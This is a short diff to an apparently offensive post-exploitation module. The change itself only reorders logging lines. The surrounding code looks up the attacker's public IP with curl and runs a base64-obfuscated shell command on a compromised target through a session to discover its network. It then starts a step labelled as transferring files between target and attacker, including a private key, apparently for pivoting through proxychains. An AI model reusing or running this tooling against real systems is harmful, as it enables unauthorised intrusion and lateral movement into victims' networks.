@@ -43,14 +43,16 @@ class Module(BaseModule):
             # PROXYCHAINS_CONF_FILE=./myproxychains.conf
             # get the attacker public ip
             result = subprocess.run(['curl', '-s', 'https://icanhazip.com'], cwd='/tmp', capture_output=True, text=True)
-            session.log(f'Attacker IP: {result.stdout}')
             attacker_ip = result.stdout
+            session.log(f'Attacker IP: {attacker_ip}')
+            
 
             # get the attacker lan
             payload = base64.b64encode(b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1')
             result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
-            session.log(f'Target LAN: {result.stdout}')
             target_lan = bytes(result.stdout).decode().strip()
+            session.log(f'Target LAN: {target_lan}')
+            
 
             # transfer files from target to attacker
             session.log("copying private key to target...")
